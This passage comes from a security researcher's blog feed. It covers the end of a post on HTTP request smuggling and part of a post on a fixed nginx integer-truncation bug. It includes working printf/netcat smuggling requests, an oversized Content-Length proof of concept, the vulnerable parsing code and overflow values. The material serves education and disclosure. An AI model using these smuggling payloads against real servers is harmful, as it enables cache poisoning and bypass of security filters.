&lt;pre&gt;&lt;code&gt;    [Origin]        [transmitter-target]         [Splitter]
        |                    |                    |
        &amp;gt;-----qA+(qB)-------&amp;gt;|                    |
        &amp;gt;-----qC------------&amp;gt;|                    |
        |                    &amp;gt;-----qA+(qB)-------&amp;gt;| [*RS*]
        |                    |&amp;lt;-----------rAqA----&amp;lt;
        |&amp;lt;-----------rAqA----&amp;lt;                    |
        |                    &amp;gt;-----qC------------&amp;gt;|
        |             [*CP*] |&amp;lt;-----------rBqB----&amp;lt;
        |&amp;lt;-----------*rBqC*--&amp;lt;                    |
        |                    |&amp;lt;-X---------rCqC----&amp;lt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This sort of behavior can also go wrong without caching (no &lt;code&gt;[*CP*]&lt;/code&gt;) if you can
make the &lt;code&gt;&amp;lt;--*rBqC*--&amp;lt;&lt;/code&gt; response redirected to another user than the original
attacker (obviously this should never happen...).&lt;/p&gt;

&lt;p&gt;If the Splitting attack can be issued by an application issue &lt;strong&gt;you still do not
need a transmitter&lt;/strong&gt; but you need this actor to be a &lt;strong&gt;target&lt;/strong&gt;.&lt;/p&gt;

&lt;h3&gt;Encapsulating and Fingerprinting&lt;/h3&gt;

&lt;p&gt;In real life, the attacker may need to navigate through several
transmitters. Like hiting an HAProxy first, then an Apache mod_proxy, then a
Varnish and finally an Nginx (yes, that happens).&lt;/p&gt;

&lt;p&gt;The first job of the attacker is &lt;strong&gt;fingerprinting&lt;/strong&gt; the middleware. To identify
the layers present in the middleware you have some Headers in the responses
(like the &lt;code&gt;Server&lt;/code&gt; header or somes variations on &lt;code&gt;X-Cache&lt;/code&gt;). But you also have
the ability of checking the behaviors of the agents for each HTTP protocol error.&lt;/p&gt;

&lt;p&gt;Every agent can have is own list of rejected syntax errors. For example Nginx
will always reject an HTTP request using CR as line terminator instead of CRLF.
Apache would not. Varnish3 will understand CR end of lines, Varnish 4 would not,
etc.&lt;/p&gt;

&lt;p&gt;You can build a fingerprinting test to identify who is rejecting you (and
sometimes you'll get lucky and have the server signature in the error page).&lt;/p&gt;

&lt;p&gt;And you can also use encapsulation to target the fingerprinting test at a
precise level.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Encapsulation&lt;/strong&gt;, is the ability to hide your HTTP query in several layers of
HTTP smuggling issues. Usually the first layers are applying some strict rules
on the HTTP headers or location, but if you find a transmitter issue in the layer
you can carry in the request body another type of smuggling issue (one that
would be detected if used directly on this layer). The encapsulation is
available because usually the Proxy will not filter the request body (and
against a filter trying to decode the request body, you could use several layers
of Content-Transfer encoding).&lt;/p&gt;

&lt;p&gt;In this example Middleware1 is a transmitter to a first type of smuggling noted
&quot;()&quot; but would prevent any smuggling of a second type &quot;{}&quot;.
 We could say for example that the &quot;()&quot; smuggling issue is using a chunked
encoding issue and that the &quot;{}&quot; one is based on doubling Content-Length headers.&lt;br/&gt;
Middleware2 is a transmitter of the second type &quot;{}&quot; of smuggling (double
&lt;code&gt;Content-Length&lt;/code&gt; headers).&lt;br/&gt;
The End server is very sensible to the &quot;{}&quot; issue and is splitting the query.&lt;/p&gt;

&lt;p&gt;Goal of the attack is cache poisonning in Middleware2 with a &lt;code&gt;W&lt;/code&gt; query response
on a &lt;code&gt;I&lt;/code&gt; request. &lt;code&gt;W&lt;/code&gt; is &lt;strong&gt;forbidden&lt;/strong&gt; on Middleware 1 and also on Middleware 2.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[Attacker]         [Middleware1]     [Middleware2]   [End Server]
    |            [transmitter ()]  [transmitter {}]  [ Splitter ]
    |                   |                |               |
    &amp;gt;-qS(+qA{+qW})-----&amp;gt;|                |               |
    &amp;gt;-qB --------------&amp;gt;|                |               |
    &amp;gt;-qI---------------&amp;gt;|                |               |
    |                   &amp;gt;-qS(+qA{+qW})--&amp;gt;| [*RS*]        |
    |                   |                &amp;gt;----qS--------&amp;gt;|
    |                   |                |&amp;lt;-----rSqS-----&amp;lt;
    |                   |&amp;lt;----rSqS-------&amp;lt;               |
    |&amp;lt;---------rSqS-----&amp;lt;                |               |
    |                   &amp;gt;-qB------------&amp;gt;|               |
    |                   |                &amp;gt;--qA{+qW}-----&amp;gt;| [*RS*]
    |                   |         [*CP*] &amp;lt;---------rAqA--&amp;lt;
    |                   |&amp;lt;---*rAqB*------&amp;lt;               |
    |&amp;lt;--------*rAqB*----&amp;lt;                |               |
    |                   &amp;gt;-qI------------&amp;gt;|               |
    |                   |         [*CP*] &amp;lt;---------rWqW--&amp;lt;
    |                   |&amp;lt;---*rWqI*------&amp;lt;               |
    |&amp;lt;--------*rWqI*----&amp;lt;                |               |
    |                   |                &amp;gt;--qB--&amp;gt;(...)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just to add one step of complexity you can also imagine a system where an HTTP
response is forged (via a flaw in an application or via a stored attack), and
this HTTP response could contain a &lt;strong&gt;response splitting&lt;/strong&gt; attack,
something like &lt;code&gt;&amp;lt;--*rAqA(+rWqX)*--&amp;lt;&lt;/code&gt;. Securities are always stronger in request
filters than in response filters on proxies, and most project would reject
theses issues as securty problems (&quot;we have to trust the backend responses, you see, that's a
backend issue&quot;).&lt;/p&gt;

&lt;p&gt;If the attackers can guess the servers and versions at each step of the
middleware, and if a lot of smuggling issues exists in the ecosystem, a complex
and very targeted attack can be made.&lt;/p&gt;

&lt;p&gt;If you understood the previous paragraphs you are ready to test it (or to read
the &lt;a href=&quot;http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf&quot; title=&quot;HTTP Request Smuggling - watchfire (pdf)&quot;&gt;2005 Watchfire study&lt;/a&gt;).&lt;/p&gt;

&lt;h3&gt;SSL/HTTPS as a protection?&lt;/h3&gt;

&lt;p&gt;Well, no, not really.&lt;/p&gt;

&lt;p&gt;SSL is sometimes mentionned as one way of preventing HTTP Smuggling. It's not.&lt;/p&gt;

&lt;p&gt;Having your HTTP message transmission encoded in an SSL tunnel is not preventing
bad interpretation of the message by the HTTP agent. HTTP Smuggling occurs
&lt;em&gt;after&lt;/em&gt; the transmission. Maybe having SSL tunnelled through a proxy which is
not trying to understand the content of the message (a pipe) could prevent a
Smuggling issue on this proxy, but that's all. Mmmh, yes it could also make the
simple tests more complex to perform (as it's hard to communicate in SSL in a
telnet session) but that's not a real defense for this subject (not that you
should not use https for other reasons).&lt;/p&gt;

&lt;h2&gt;Testing HTTP&lt;/h2&gt;

&lt;p&gt;Usually an HTTP request is made by a browser. You have some really nice tools to
alter HTTP request on the browser for testing purpose. If you already try to
attack yourself (of course yourself) with XSS or HTML injections you certainly
already altered parameters on the queries with tools like Live HTTP Headers (and
 others), or maybe extracted curl queries from live queries.&lt;/p&gt;

&lt;p&gt;But for HTTP smuggling you will usually need to test HTTP &lt;strong&gt;without&lt;/strong&gt; a browser,
because you will need to make very bad queries, and browsers never does bad
queries. Well, in the past they was an issue end-of-line injections on Digest
 Authentication names or with bad separators on Ajax queries. But finding a flaw
in a browser that allows HTTP smuggling requests coming from &lt;em&gt;regular&lt;/em&gt; browsers
is an exception. Smuggling does not usually imply that Suzann is an innocent
smuggler using a regular browser.&lt;/p&gt;

&lt;p&gt;No, what you will need is the full control of all characters in a query. For
example you will need to control what characters are used as space separators or
end-of-line.&lt;/p&gt;

&lt;p&gt;Hopefully HTTP is a text based protocol, and is quite simple. If you never
tried it you can always try an HTTP session with a telnet on port 80 of your
server.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ telnet 127.0.0.1 80
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
GET / HTTP/1.1                &amp;lt;---start typing here... fast!
Host: foobar                  &amp;lt;---required header in HTTP/1.1
                              &amp;lt;--- last enter for end of request
HTTP/1.1 301 Moved Permanently  &amp;lt;-- and now the server response
Server: nginx
Date: Sat, 25 Jul 2015 16:02:21 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Keep-Alive: timeout=15
Location: http://foobar.example.com/
X-Frame-Options: SAMEORIGIN

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;301 Moved Permanently&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body bgcolor=&quot;white&quot;&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;301 Moved Permanently&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But you need to type fast, and do not have a nice control on characters.
The other method for fast testing is using &lt;code&gt;printf&lt;/code&gt; to print a query on screen:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ printf 'GET / HTTP/1.1\r\nHost:\tfoobar\r\n\r\n'
GET / HTTP/1.1
Host:   foobar
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or directly to the server (here I use &lt;strong&gt;netcat&lt;/strong&gt; instead of telnet for that):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ printf 'GET / HTTP/1.1\r\nHost:\tfoobar\r\n\r\n' | nc 127.0.0.1 80
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Sat, 25 Jul 2015 16:02:21 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Keep-Alive: timeout=15
Location: http://foobar.example.com/
X-Frame-Options: SAMEORIGIN

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;301 Moved Permanently&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body bgcolor=&quot;white&quot;&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;301 Moved Permanently&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this sort of queries you can test easily the response of the server to a
degraded HTTP query, let's for example try to replace all CR-LF (&lt;code&gt;\r\n&lt;/code&gt;) end of
lines with just CR (&lt;code&gt;\r&lt;/code&gt;).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ printf 'GET / HTTP/1.1\rHost:\tfoobar\r\r' | nc 127.0.0.1 80
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body bgcolor=&quot;white&quot;&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;400 Bad Request&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And you can do advanced queries with printf alone. Like a simple pipeline of
queries:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ printf 'GET /Suzann.html HTTP/1.1\r\nHost: example.com\r\n\nGET /ivan.html HTTP/1.1\nHost:example.com\r\n\r\n' | nc 127.0.0.1 80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Which becomes hard to read (and here we have only the strict minimum headers).&lt;/p&gt;

&lt;p&gt;Next step is to build your own tool. For my extensive tests I've build my tools
with &lt;strong&gt;python&lt;/strong&gt;, using the &lt;code&gt;socket&lt;/code&gt; library you have a very nice low level HTTP
client where all the strange things are allowed, and you have an high level
language to compute sizes (hiding queries in chunks, counting bytes, etc),
 or to add SSL support.&lt;/p&gt;

&lt;p&gt;If you really want to study smuggling you will have to use &lt;strong&gt;tcpdump&lt;/strong&gt; or
&lt;strong&gt;wireshark&lt;/strong&gt; to study the transmission of the signal between the actors, who is
cleaning up the messages, what is not cleaned up, how does timers and size
thresholds alter the behaviors, etc.&lt;/p&gt;

&lt;p&gt;The final tool, &lt;strong&gt;the best one&lt;/strong&gt;, is &lt;strong&gt;the code&lt;/strong&gt;, do not be afraid of reading
the code (when available). Learn the protocol and check implementations, that's
the reason of open source code, open source needs critical eyes studying the
code. That's the reason of superior robustness for open source code, but you
will certainly discover that a lot of code still need to be fixed.&lt;/p&gt;

&lt;h2&gt;First final words&lt;/h2&gt;

&lt;p&gt;I'll end this article here, next things to come soon, with real world issues.
But while waiting for new contents you can already try to read some posts
and test your tools.&lt;/p&gt;

&lt;p&gt;If you are using HTTP (and who isn't?), and usually use reverse proxies, SSL
terminators, reverse proxy caches, my first advice is to check that you have
recent versions.
Smuggling issues are real, some have been fixed in 2015, avoid keeping old
versions in production.&lt;/p&gt;

&lt;p&gt;But I know this can be a hard task. So my second advice is to add an HTTP
cleaner in front of your infrastructure. Something like &lt;a href=&quot;http://www.haproxy.org&quot; title=&quot;HAProxy&quot;&gt;HAProxy&lt;/a&gt;. This
tool is very strong to protect against smugglers (but take recent versions, of
 course). Simply reading the &lt;a href=&quot;http://www.haproxy.org/download/1.6/doc/configuration.txt&quot; title=&quot;HAProxy configuration&quot;&gt;configuration documentation&lt;/a&gt; of this
product you can find an excellent introduction to the HTTP protocol, with common
pitfalls documented.&lt;/p&gt;
</description>
				<published>2015-10-04 00:00:00 +0200</published>
				<link>http://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one/</link>
			</item>
		
			<item>
				<title>Nginx Integer Truncation</title>
				<description>&lt;p&gt;&lt;small&gt; &lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;http://makina-corpus.com/blog/metier/2015/debordement-dentiers-dans-nginx-fixe-en-1-7-11&quot;&gt;makina corpus&lt;/a&gt;.)&lt;/small&gt;&lt;/p&gt;

&lt;h2&gt;Nginx 1.7.11&lt;/h2&gt;

&lt;p&gt;A new 1.7.11 version of Nginx has just been released (24-03-2015) and if you look at the &lt;a href=&quot;http://nginx.org/en/CHANGES&quot;&gt;CHANGES file&lt;/a&gt; you can see this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    *) Bugfix: in integer overflow handling.
           Thanks to Régis Leroy.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;yes, that's me :-), the code diff is visible in &lt;a href=&quot;http://hg.nginx.org/nginx/rev/15a15f6ae3a2&quot;&gt;mercurial, here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The real fix committed is better than the one I originally submitted. But the interesting fact is that this was an &lt;strong&gt;integer overflow bug&lt;/strong&gt;. I do not think I were the first one to report this problem as, for example, on the openBSD httpd project documents like &lt;a href=&quot;http://www.openbsd.org/papers/httpd-asiabsdcon2015.pdf&quot;&gt;this one&lt;/a&gt; we can read:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;It turned out that nginx uses many calls with the idiom malloc(num * size) and does not attempt to detect integer overflows (...)&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Starting from this 1.7.11 version things should be better, but for all previous versions this could be used to make nasty things. To be honest I did not found any big issue exploiting it, but at least I've found one way of using it with the Content-Length HTTP header.&lt;/p&gt;

&lt;h2&gt;For the record&lt;/h2&gt;

&lt;p&gt;I'm currently working on my spare time around several HTTP Smuggling tricks, searching for differences between web servers in the way they manage badly formatted HTTP. I'll made some reports of my findings later. To make it short, HTTP Smuggling attacks are based on hidden http queries, ways to hide full or partial http requests from some http agents in a chain, it can be used for cache poisoning, DOS or security bypass.&lt;/p&gt;

&lt;p&gt;Anyway I was trying a set of bad-formatted http queries against Nginx, it was quite late -- well it was very late, something like 02:00 --. I should have been sleeping, and I was in fact starting to sleep on my keyboard.&lt;/p&gt;

&lt;p&gt;I was trying to send requests with &lt;em&gt;simple&lt;/em&gt; oneliners, on the command line, this way:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf 'POST /foo.html HTTP/1.1\015\012Host: www.dummy-host.example.com\015\012Content-Type: application/x-www-form-urlencoded\015\012Content-Length : 15\015\012Content-Length:104\015\012\015\012GET /fic3.html?GET http://www.dummy-host.example.com/fic2.html HTTP/1.1\015\012Host: www.dummy-host.example.com\015\012\015\012GET /fic1.html HTTP/1.1\015\012Host: www.dummy-host.example.com\015\012\015\012'| netcat 127.0.0.1 80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This one is rejected because it contains two Content-Length headers. Rejecting such requests is the base protection against HTTP smuggling.&lt;/p&gt;

&lt;p&gt;Sleeping with a finger on the keyboard key '0', I ended-up sending that query (which is in fact only one query) -- if you wonder what are &lt;code&gt;\015&lt;/code&gt; and &lt;code&gt;\012&lt;/code&gt; they are the CR-CarriageReturn (\r) and LF-LineFeed (\n) ascii character, HTTP is like windows, it works with CRLF end of lines.--. I explode the oneliner on several lines for better readability:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf 'GET /fic1.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'Content-Type: application/x-www-form-urlencoded\015\012'\
'Content-Length:90000000000000000000000000000000000000000000000000000000000000015 \015\012'\
'\015\012123456789012345'\
'GET http://www.dummy-host.example.com/fic2.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'\015\012'| netcat 127.0.0.1 80
----------------
HTTP/1.1 200 OK
Server: nginx/1.2.1
Date: Sat, 28 Feb 2015 18:22:18 GMT
Content-Type: text/html
Content-Length: 41
Last-Modified: Sun, 08 Feb 2015 23:51:13 GMT
Connection: keep-alive
Accept-Ranges: bytes

&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;H1&amp;gt;FIRST&amp;lt;/H1&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
HTTP/1.1 200 OK
Server: nginx/1.2.1
Date: Sat, 28 Feb 2015 18:22:18 GMT
Content-Type: text/html
Content-Length: 42
Last-Modified: Sun, 08 Feb 2015 23:51:33 GMT
Connection: keep-alive
Accept-Ranges: bytes

&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;H1&amp;gt;SECOND&amp;lt;/H1&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nginx responded to that query, it did not send me a &quot;413&quot; response, and I was awake enough to realize it. I have two valid responses for 1 single query.&lt;/p&gt;

&lt;p&gt;With a shorter Content-length you have the right behavior (an error 413):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf 'GET /fic1.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'Content-Type: application/x-www-form-urlencoded\015\012'\
'Content-Length:90000015 \015\012'\
'\015\012123456789012345'\
'GET http://www.dummy-host.example.com/fic2.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'\015\012'| netcat 127.0.0.1 80
-----------
HTTP/1.1 413 Request Entity Too Large
Server: nginx/1.2.1
Date: Wed, 25 Mar 2015 17:39:49 GMT
Content-Type: text/html
Content-Length: 198
Connection: close

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;413 Request Entity Too Large&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body bgcolor=&quot;white&quot;&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;413 Request Entity Too Large&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx/1.2.1&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The request sent is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1 - GET /fic1.html HTTP/1.1[CR][LF]
2 - Host: www.dummy-host.example.com[CR][LF]
3 - Content-Type: application/x-www-form-urlencoded[CR][LF]
4 - Content-Length:900000000000000000000000000000000000000000000000000000015 [CR][LF]
5 - [CR][LF]
6 - 123456789012345GET http://www.dummy-host.example.com/fic2.html HTTP/1.1[CR][LF]
7 - Host: www.dummy-host.example.com[CR][LF]
8 - [CR][LF]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is a GET request containing a Body (line 6 to 8) (something unusual, usually only POST queries should send body parts). The fact we have two responses for this request means Nginx is reading this request like a pipeline of two or more requests, this way:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# Request 1: a GET query with a body of size 15
1 - GET /fic1.html HTTP/1.1[CR][LF]
2 - Host: www.dummy-host.example.com[CR][LF]
3 - Content-Type: application/x-www-form-urlencoded[CR][LF]
4 - Content-Length: 15 [CR][LF]
5 - [CR][LF]
6 - 123456789012345 #&amp;lt;----------- this is 15 bytes
# Request 2: another request
6 - GET http://www.dummy-host.example.com/fic2.html HTTP/1.1[CR][LF]
7 - Host: www.dummy-host.example.com[CR][LF]
8 - [CR][LF]
&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;Integer Overflow truncation&lt;/h2&gt;

&lt;p&gt;We have this 900000000000000000000000000000000000000000000000000000015 read as 15, this is usually an integer overflow bug.
A bunch of functions in nginx could lead to such overflows, &lt;code&gt;ngx_atoi&lt;/code&gt;, &lt;code&gt;ngx_atofp&lt;/code&gt;, &lt;code&gt;ngx_atosz&lt;/code&gt;, &lt;code&gt;ngx_atoof&lt;/code&gt;, &lt;code&gt;ngx_atotm&lt;/code&gt; and &lt;code&gt;ngx_hextoi&lt;/code&gt;.
If I remember well, the one used for the Content-Length header parsing is &lt;code&gt;ngx_atosz&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let's analyze one of the functions before the fix:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;ngx_atosz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
            &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The goal is to transform a text containing a number, like &quot;15&quot; to a number, 15. &lt;code&gt;line&lt;/code&gt; contains the string and &lt;code&gt;n&lt;/code&gt; is the string length. The &lt;code&gt;(*line &amp;lt; '0' || *line &amp;gt; '9')&lt;/code&gt; test ensure each character of the line is really a digit.&lt;/p&gt;

&lt;p&gt;For each character the final number is computed by doing a &lt;code&gt;* 10&lt;/code&gt; with the previous compute value and then adding the digit.&lt;/p&gt;

&lt;p&gt;But with long strings of digits, comes a time when doing a &lt;code&gt;* 10&lt;/code&gt; in the C code makes your number smaller, because you hit the maximum value, with signed integers your result is at first a negative integer. When you'll hit the limit a second time you may end up with short positive values, and loop on the allowed ranges, or maybe not, the behavior is &lt;strong&gt;unknown&lt;/strong&gt;, it depends on the compiler, the OS, etc.&lt;/p&gt;

&lt;p&gt;On my own tests, one a local server, I was able to obtain a 15 quite easily with a string number containing a lot of '0' -- like the thing obtained by accident--. I don't really know why. somewhere in the loop &lt;code&gt;value&lt;/code&gt; comes to 0, one thing is sure, when you bypass the limits strange things happens.&lt;/p&gt;

&lt;p&gt;Remember that the final result may depend on your architecture:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;request Content-length / parsed Content Length
'10'                   =&amp;gt; 10
'9224000000000000000'  =&amp;gt; -9222744073709551616
'36893488147419103231' =&amp;gt; -1
'36893488147419103232' =&amp;gt; 0
'36893488147419103233' =&amp;gt; 1
'36893488147419103247' =&amp;gt; 15
'368934881474191032320000000000015' =&amp;gt; 15
'3689348814741910323200000000000000000015' =&amp;gt; 15
'36893488147419104005' =&amp;gt; 773
'36893488147420000005' =&amp;gt; 896773
'90000000000000000000000000000000000000000000000000000' =&amp;gt; -5507902344274116608
'900000000000000000000000000000000000000000000000000000' =&amp;gt; 261208778387488768
'9000000000000000000000000000000000000000000000000000000' =&amp;gt; 2612087783874887680
'90000000000000000000000000000000000000000000000000000000' =&amp;gt; 7674133765039325184
'900000000000000000000000000000000000000000000000000000000' =&amp;gt; 2954361355555045376
'9000000000000000000000000000000000000000000000000000000000' =&amp;gt; -7349874591868649472
